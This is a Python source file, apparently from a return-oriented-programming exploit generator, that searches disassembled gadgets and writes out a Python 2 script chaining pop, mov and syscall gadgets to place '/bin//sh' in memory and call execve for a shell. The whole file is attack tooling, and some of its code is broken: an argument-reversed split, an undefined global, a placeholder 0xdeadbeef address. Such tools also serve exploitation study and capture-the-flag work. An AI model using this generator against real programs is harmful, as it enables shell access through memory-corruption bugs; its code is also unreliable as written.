import struct
import sys
import re

REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "rsp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
                "eax", "ebx", "ecx", "edx", "edi", "esi", "esp", "ebp", "r9d", "r10d", "r11d", "r12d", "r13d", "r14d", "r15d", 
                "ax", "bx", "cx", "dx", "r9w", "r10w", "r11w", "r12w", "r13w", "r14w", "r15w", 
                "al", "bl", "cl", "dl", "r9b", "r10b", "r11b", "r12b", "r13b", "r14b", "r15b", 
                "ah", "bh", "ch", "dh"
            ]

def operands(csinsn):
    return ', '.split(csinsn.op_str)

def LoadConstIntoReg(GadgetList, Reg, Const, fd) : 

    RegList = queryGadgets(GadgetList, Reg)
   
    # Search for "pop Reg; ret"
    x = 0
    while x < len(RegList) : 

        gadget = RegList[x]
        inst = gadget[0]

        if inst.mnemonic == "pop" : 

            # "pop Reg; ret" is found
            # Steps to be taken: 
            #   1. Put Const onto stack
            #   2. Execute "pop Reg; ret"

            # Write it into the file
            
            # Write address of "pop Reg; ret"
            fd.write("payload += struct.pack('<Q', ")
            fd.write(hex(int(inst.address)))
            fd.write(")")
            fd.write("\t\t# Address of 'pop Reg; ret'")
            fd.write("\n\t")
        
            # Write Const onto stack
            fd.write("payload += struct.pack('<Q', ")
            fd.write(str(hex(Const)))
            fd.write(")")
            fd.write("\n\t")
            
            return
        
        x = x + 1
    
  
    # Search for "xor Reg, Reg; ret"
    # x = 0
    # while x < len(RegList) : 
        
    #    gadget = RegList[x]
    #    inst = gadget[0]
       
    #    if inst['mnemonic'] == "xor" : 
            # "xor Reg, Reg; ret" is found
            # Loads 0 into Reg
            # Jackpot!
            # Steps to do: 
            #   1. Execute "xor Reg, Reg; ret"
            #   2. Call changeRegValue if Const != 0

            # Write it into the file
    #        fd.write("payload += struct.pack('<Q', ")
    #        fd.write(hex(int(inst['address'])))
    #        fd.write(")")
    #        fd.write("\t\t# Address of 'xor Reg, Reg; ret'")
    #        fd.write("\n\t")
    
    print("Unable to find necessary gadgets to load a value into a register")
    print("Exiting...")
    sys.exit()

def getSyscallList():
    if(len(syscall)):
        # print(syscall)
        return syscall
    else:
        return list()

# From the categorized gadgets, this routine will return a list of gadgets belonging to the queried category and containing target register.
def queryGadgets(GadgetList, targetReg):

    L = GadgetList

    ReturnList = list()

    x = 0
    for gadget in L:
        inst = gadget[0]

        if targetReg in operands(inst): 
            ReturnList.append(gadget)
        
        # Keep the loop going!
        x = x + 1
    
    return ReturnList

def getPopGadgets(Gadgets):
    popGadgets = list()

    for gadget in Gadgets:
        if len(gadget) == 2:
            if gadget[-2].mnemonic == 'pop':
                popGadgets.append(gadget)

    return popGadgets

def getMovQwordGadgets(Gadgets):
    movQwordGadgets = list()

    for gadget in Gadgets: # TODO: Clean up this mess
        if len(gadget) >= 2:
            if gadget[-2].mnemonic == 'mov':
                ops = operands(gadget[-2])
                if re.search("^qword ptr \[[a-z]+\]$", ops[0])  and ops[1] in REGISTERS : 
                    if(gadget[-2:] not in movQwordGadgets): # no duplicates please
                        movQwordGadgets.append(gadget[-2:])

    return movQwordGadgets

def canWrite(movQwordGadgets, popGadgets):
    for gadget in movQwordGadgets:
        ops = operands(gadget[-2])
        op1 = ops[0][-4:-1]
        op2 = ops[1]
        f1 = 0
        f2 = 0
        pop1 = None
        pop2 = None
        for popGadg in popGadgets:
            if operands(popGadg[0])[0] == op1:
                f1 =1
                pop1 = popGadg
                break
        for popGadg in popGadgets:
            if operands(popGadg[0])[0] == op2:
                f2 =1
                pop2 = popGadg
                break
        if(f1 and f2):
            return [gadget, pop1, pop2] # returns [ mov qword ptr [rega], reb, pop rega, pop regb ] 
    return list()

def WriteStuffIntoMemory(GadgetList, data, addr, fd) : 

    popGadgets = getPopGadgets(GadgetList)
    movQwordGadgets = getMovQwordGadgets(GadgetList)

    movpopGadgets = canWrite(movQwordGadgets, popGadgets)

    if len(movpopGadgets) == 0: 
        print("Didn't find gadgets necessary to write stuff into memory")
        print("ROP Chaining failed")
        sys.exit()

    movGadget = movpopGadgets[0][0]
    popGadget1 = movpopGadgets[1][0]
    popGadget2 = movpopGadgets[2][0]
   
    count = 0
    while len(data) > 0 : 

        if len(data) <= 8: 
            data_piece = data
            data = ''
        
        else : 
            data_piece = data[:8]
            data = data[8:]

        # Execute popGadget1 => Reg1 will have .data's address
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(popGadget1.address)))
        fd.write(")")
        fd.write("\t\t# Address of pop Reg1; ret")
        fd.write("\n\t")

        # Put .data's address onto stack
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(addr)))
        fd.write(")")
        fd.write("\t\t# Address of .data section")
        fd.write("\n\t")
        addr = addr + 8

    
        # Execute popGadget2 => Reg2 will have "/bin/sh"
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(popGadget2.address)))
        fd.write(")")
        fd.write("\t\t# Address of pop Reg2; ret")
        fd.write("\n\t")

        # Put "/bin//sh" into stack
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int.from_bytes(data_piece, byteorder = 'little')))
        fd.write(")")
        # fd.write("\t\t# ascii of '/bin//sh'")
        fd.write("\n\t")

        # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
        fd.write("payload += struct.pack('<Q', ")
        fd.write(hex(int(movGadget.address)))
        fd.write(")")
        fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
        fd.write("\n\t")

def checkIfSyscallPresent(GadgetList) : 

    syscallList = list()

    x = 0
    for gadget in GadgetList:
        inst = gadget[0]
        if inst.mnemonic == "syscall": 
            syscallList.append(gadget)
        
    
    return syscallList

def writeHeader(fd) : 

    fd.write("#!/usr/bin/env python2")
    fd.write("\n\n")
    fd.write("import struct")
    fd.write("\n\n")
    fd.write("if __name__ == '__main__' : ")
    fd.write("\n\n\t")
    fd.write("# Enter the amount of junk required")
    fd.write("\n\t")
    fd.write("payload = ''")
    fd.write("\n\n\t")

def writeFooter(fd): 

    fd.write("\n\t")
    fd.write("fd = open('payload.txt', 'wb')")
    fd.write("\n\t")
    fd.write("fd.write(payload)")
    fd.write("\n\t")
    fd.write("fd.close()")    
    fd.write("\n\t")
    fd.close()

def execveROPChain(GadgetList): 

    print("\n\n-->Chaining to get a shell using execve system call")
    """ Get a section from the file, by name. Return None if no such
            section exists.
    """
# TODO
#    data_section = ".data"
#    section = get_section_by_name(data_section)
    
    # We need .data section's details because we have to write "/bin//sh" into it. 
#    data_section_addr = section["sh_addr"]
    data_section_addr = 0xdeadbeef

    syscallList1 = checkIfSyscallPresent(GadgetList)
    
    # if syscall is found, 
        # rax <- 59
        # rdi <- Address of "/bin/sh"
        # rsi <- 0
        # rdx <- 0
        # syscall
    
    if len(syscallList1) > 0: 
        execve_bin_sh(GadgetList, data_section_addr)
        sys.exit()

    print("--> No syscall => ROP Chaining failed")
    sys.exit()

def execve_bin_sh(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("execveROPChain.py", "w")
    writeHeader(fd)
    
    # Step-2: Writing "/bin//sh" into .data section
    binsh = 0x68732f2f6e69622f
    binsh = struct.pack('<Q', binsh)
    WriteStuffIntoMemory(GadgetList, binsh, data_section_addr, fd)
 
    # Step-1: rax <- 59
    LoadConstIntoReg(GadgetList, "rax", 59, fd)

	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
    LoadConstIntoReg(GadgetList, "rdi", data_section_addr, fd)

	# Step-4: rsi <- 0
    LoadConstIntoReg(GadgetList, "rsi", 0, fd)

    # Step-5: rdx <- 0
    LoadConstIntoReg(GadgetList, "rdx", 0, fd)


    # Get syscall
    syscallList = checkIfSyscallPresent(GadgetList)
    if len(syscallList) == 0: 
        syscallList = getSyscallList()
        syscallAddress = syscallList[0][0]
    
    else : 
        syscallGadget = syscallList[0]
        syscallDict = syscallGadget[0]
        syscallAddress = syscallDict.address
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    
    writeFooter(fd)
    print("-->Written the complete payload in execveROPChain.py")
    print("-->Chaining successful!")
